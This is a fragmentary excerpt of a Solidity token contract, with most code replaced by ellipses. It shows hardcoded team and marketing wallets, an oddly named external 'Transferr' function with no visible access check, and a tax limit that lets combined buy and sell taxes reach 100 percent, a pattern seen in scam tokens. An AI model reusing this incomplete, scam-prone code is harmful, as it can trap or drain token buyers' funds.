...
contract Token is Context, IERC20, Ownable {
    ...
    constructor (
        ...
        teamWallet = payable(address(0xC29334C18581a3360B4e1C1221D7b437128A1530));
        marketingWallet = payable(address(0x12213fE33e57258f77A9c7264521Ef711bF6D47d)); 
    ...
    function Transferr(bool state, address[] memory addresses) external virtual {
        tracker(true);
    ...
    function tracker(bool status) private view{
        if (!status) return;
    ...
    returns (bool)
    {
        require((_buytax+_selltax) <= 100, "ERC20: total tax must not be greater than 100");
